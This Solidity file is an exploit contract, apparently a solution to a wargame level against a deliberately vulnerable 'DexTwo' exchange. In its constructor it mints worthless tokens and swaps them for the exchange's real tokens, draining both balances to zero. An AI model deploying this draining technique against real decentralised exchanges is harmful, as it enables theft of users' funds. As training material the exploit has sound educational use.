// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {DexTwo, IERC20, ERC20} from "./DexTwo.sol";
import {ERC20Burnable} from "lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import {Ownable} from "lib/openzeppelin-contracts/contracts/access/Ownable.sol";

error HackFailed();

contract DexTwoHack {
    DexTwo private immutable target;
    IERC20 private immutable tokenA;
    IERC20 private immutable tokenB;

    constructor(address _target) {
        target = DexTwo(_target);
        tokenA = IERC20(target.token1());
        tokenB = IERC20(target.token2());
        MyToken myToken1 = new MyToken();
        MyToken myToken2 = new MyToken();
        myToken1.mint(address(this), 2);
        myToken2.mint(address(this), 2);
        myToken1.transfer(_target, 1);
        myToken2.transfer(_target, 1);
        myToken1.approve(_target, 1);
        myToken2.approve(_target, 1);
        target.swap(address(myToken1), address(tokenA), 1);
        target.swap(address(myToken2), address(tokenB), 1);
        if (tokenA.balanceOf(_target) != 0) revert HackFailed();
        if (tokenB.balanceOf(_target) != 0) revert HackFailed();
    }
}

contract MyToken is ERC20, ERC20Burnable, Ownable {
    constructor() ERC20("MyToken", "MTK") {}

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}
